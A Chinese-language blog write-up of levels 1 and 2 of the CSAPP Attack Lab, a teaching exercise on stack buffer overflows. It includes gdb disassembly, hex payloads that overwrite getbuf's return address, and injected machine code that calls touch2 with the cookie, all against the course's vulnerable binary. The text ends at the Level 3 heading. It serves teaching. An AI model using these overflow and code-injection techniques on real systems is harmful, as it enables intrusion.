---
title: "CSAPP: Attack Lab"
date: 2020-05-10T16:29:10+08:00
utterances: 75
math: true
toc: true
categories: CSAPP
tags: 
  - CSAPP
  - Computer Science
---

# 实验内容

本实验是 CSAPP:3e 一书的配套实验之一，相关资料如下：

- [实验文件](http://csapp.cs.cmu.edu/3e/target1.tar)
- [实验要求](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

在本次实验中，我们将试着对给定的可在 Linux 下运行的二进制文件进行缓冲区溢出攻击。实验一共分为五个部分，每一个部分的具体要求都会在后文中详述。

本文随自己的实验进度缓慢更新……~~（咕咕）~~

# 知识回顾

**对于 x86 平台，程序运行时调用函数的过程是怎样的？**

为了能够实现函数递归，函数调用的相关信息都是在 *栈 (stack)* 中进行维护的。在 x86 汇编中，寄存器 `%rsp` 指向栈顶位置，寄存器 `%rbp` 指向栈起始的位置，同时栈是从高地址向低地址生长的。当调用函数时，大致需要依次进行如下步骤：

- 将参数按照从右至左顺序压入栈中；
- 将返回地址压入栈中；
- 将旧的 `%rbp` 值压入栈中，并将 `%rbp` 的值更新为 `%rsp`。换言之，这一步即为被调用的函数更新栈的起始位置；
- 接下来便可以执行被调用的函数了；
- 执行完后，将旧 `%rbp` 值从栈中弹出，并恢复 `%rbp` 的值（因为现在回到之前的函数了）；
- 执行 `ret` 指令，跳转到返回地址（这一过程中会将栈中的参数以及返回地址弹出）。

可见，如果被执行的函数中调用了 `gets()` 函数（即允许用户输入字符串）同时没有增加任何额外安全措施，我们可以通过精心构造字符串，使得该字符串长度超出缓冲区大小，以达到对栈中其他位置的信息进行覆盖的目的。例如，我们可以通过覆盖返回地址字段，使得该函数被执行完后返回到其他的位置。更进一步，甚至可能注入自己构造的恶意代码来达到各种恶意的目的。接下来的实验就会更具体地说明这一点。

# 实验

## Level 1

### 要求

在 Level 1 中，暂且不要求注入自己构造的代码，而是构造一个字符串，使得程序执行另一处已有的代码。

在二进制可执行文件 `ctarget` 中，`getbuf()` 函数则是一个存在漏洞的获取用户输入的函数。其源代码如下：

```c
unsigned getbuf() 
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

其中 `Gets()` 与标准库中的 `gets()` 类似，它会一直读入字符串知道遇到结束符为止，而不会对缓冲区大小是否溢出进行任何检查。`getbuf()` 函数在 `test()` 函数中被调用，其源代码如下：

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

`getbuf()` 在执行完成后会返回到 `test()` 继续向后执行。我们的目的是让 `getbuf()` 执行完后跳转到程序 `touch1()` 函数处进行执行。`touch1()` 的源代码如下：

```c
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

由于本菜鸡不是 CMU 的学生，因此自然也没发连接到 CMU 记录分数的服务器。因此在运行 `ctarget` 时需要加上参数 `-q` 以避免前述服务器进行连接。另外，由于构造出的字符串很可能包含非法的 ASCII 字符，为了方便大家，`ctarget` 支持二进制文件中读取信息。同时，作者也很贴心地提供了小工具 `hex2raw` 以帮助大家把构造好的 16进制 字符串转换为二进制文件。我们首先要将我们构造好的字符串逐字节一个文本文件（如 `hex.txt`），每一个字节均使用两位16进制表示，并且字符之间用空格隔开。如：

```
0a 2d 3f ...
```

便可以生成对应二进制文件：

```
$ hex2raw < hex.txt > raw
```

最后再将其传给 `ctarget`：

```
$ ctarget -q -i raw
```

### 过程

先运行一下 `./ctarget` 看看它长啥样：

```
$ ./ctarget -q
Cookie: 0x59b997fa
Type string:Hello World!
No exploit.  Getbuf returned 0x1
Normal return
```

整个程序会要求我们输入一个字符串并显示一些结果。在这里我首先输入了 `Hello, World!`。显然这个字符串是不足以让程序出现问题的，因此其提示 `No exploit`。而我们的目的是执行函数 `touch1()`，故若成功其提示应当包含 `Touch1!: You called touch1()`。

首先来看看 `getbuf()` 的汇编代码：

```
$ gdb --args ./ctarget -q

(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:   sub    $0x28,%rsp
   0x00000000004017ac <+4>:   mov    %rsp,%rdi
   0x00000000004017af <+7>:   callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:  mov    $0x1,%eax
   0x00000000004017b9 <+17>:  add    $0x28,%rsp
   0x00000000004017bd <+21>:  retq   
End of assembler dump.
```

第一条指令表明栈顶 `%rsp` 向下生长了 `0x28`（即 40）个字节，故得知 `BUFFER_SIZE` 值为 40。输入的字符是从低地址向高地址存储的，恰好函数的返回地址也在高地址里，这为修改函数返回地址提供了可能。不妨在 `getbuf()` 处（即 `*0x4017a8` 处）打上断点，此时栈顶应当指向返回地址：

```
(gdb) b getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.

(gdb) r
Starting program: /home/codgician/GitHub/explorations/CSAPP/attack-lab/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12

(gdb) x $rsp
0x5561dca0:	0x00401976

(gdb) x 0x00401976
0x401976 <test+14>:	0x88bec289
```

可见栈顶 `0x5561dca0` 中的值为 `0x00401976`。而该地址恰好指向 `test()` 中调用 `getbuf()` 之后的位置，故可确定这就是我们想要修改的返回地址。来查询一下 `touch1()` 的地址：

```
(gdb) info address touch1
Symbol "touch1" is a function at address 0x4017c0.
```

需要注意的是，由于 x86 采取 *小端 (Little Endian)* 字节顺序，若希望栈中出现 `0x004017c0`，则我们构造的输入应当为 `c0 17 40 00`。基于上述分析，我们构造的字符串只需要首先包含 40 个任意字符，接下來再包含目标地址即可。`hex.txt` 内容如下：

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00
```

使用 `hex2raw` 将其转换为二进制文件后传入 `ctarget`，便可以达成目的：

```
$ ./hex2raw < hex.txt > raw && ./ctarget -q -i raw
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
  user id	bovik
  course	15213-f15
  lab	attacklab
  result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 
```

## Level 2

### 要求

在 Level 2 中，要求执行的函数变为 `touch2()`。与上一关不同的是，`touch2()` 函数带有一个参数。其源代码如下：

```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

`cookie` 值即之前运行时提示的 `0x59b997fa`。

### 过程

刚开始的时候本菜鸡准备投机取巧：直接跳转到 `if (val == cookie)` 后的语句之处。不过可惜作者早就考虑到了，`validate` 函数中应该还会对 `val` 进行进一步检查，所以就凉了。

复杂一点的思路，便是我们要在构造的字符串中包含调用 `touch2()` 的汇编代码，同时让程序跳转到我们注入的代码处执行。因此我们先来看看 `touch2()` 的汇编代码：

```
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:	  sub    $0x8,%rsp
   0x00000000004017f0 <+4>:	  mov    %edi,%edx
   0x00000000004017f2 <+6>:   movl   $0x2,0x202ce0(%rip)    # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:  cmp    0x202ce2(%rip),%edi    # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:  jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:  mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:  mov    $0x1,%edi
   0x000000000040180e <+34>:  mov    $0x0,%eax
   0x0000000000401813 <+39>:  callq  0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:  mov    $0x2,%edi
   0x000000000040181d <+49>:  callq  0x401c8d <validate>
   0x0000000000401822 <+54>:  jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:  mov    $0x403110,%esi
   0x0000000000401829 <+61>:  mov    $0x1,%edi
   0x000000000040182e <+66>:  mov    $0x0,%eax
   0x0000000000401833 <+71>:  callq  0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:  mov    $0x2,%edi
   0x000000000040183d <+81>:  callq  0x401d4f <fail>
   0x0000000000401842 <+86>:  mov    $0x0,%edi
   0x0000000000401847 <+91>:  callq  0x400e40 <exit@plt>
End of assembler dump.
```

可见，`touch2()` 传入的参数 `val` 被存放在寄存器 `%edi` 中，并且在 `<+16>` 处与 `cookie` 进行比较。因此，在进入 `touch2()` 前我们要将寄存器 `%edi` 中的值修改掉，即如下汇编代码：

```asm
mov $0x59b997fa, %edi
```

除此之外，需要将程序跳转至 `touch2()` 处（地址为 `0x004017ec）。故：

```asm
mov $0x004017ec, %eax
jmp *%eax
```

将上述代码汇编后，得到：

```
BF FA 97 B9 59 B8 EC 17 40 00 FF E0
```

最后，我们借助与 Level 1 类似的思路，让 `getbuf()` 执行完成后跳转到我们刚刚注入的代码，也就是字符串的起始位置 `0x5561dc78`（即 Level 1 中所提到的返回地址的位置减去 `0x28`）。最终构造出如下字符串：

```
BF FA 97 B9 59 B8 EC 17 40 00 FF E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
```

试试看～

```
$ ./hex2raw < hex.txt > raw && ./ctarget -q -i raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 B8 EC 17 40 00 FF E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
```

## Level 3

### 要求
